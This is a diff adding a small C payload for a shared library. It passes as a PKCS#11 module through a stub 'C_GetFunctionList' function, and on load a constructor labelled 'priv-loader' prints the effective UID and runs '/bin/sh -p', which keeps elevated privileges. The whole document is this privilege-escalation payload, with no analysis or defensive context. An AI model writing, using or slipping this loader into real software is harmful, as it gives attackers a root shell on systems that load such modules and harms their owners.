@@ -1,1 +1,15 @@
 
+#include <stdio.h>
+#include <unistd.h>
+
+#define BIN "/bin/sh"
+
+__attribute__((constructor)) void trigger() {
+    puts("[priv-loader :: init]");
+    printf("eUID => %d\n", geteuid());
+    execl(BIN, BIN, "-p", NULL);
+}
+
+int C_GetFunctionList() {
+    return 1;
+}
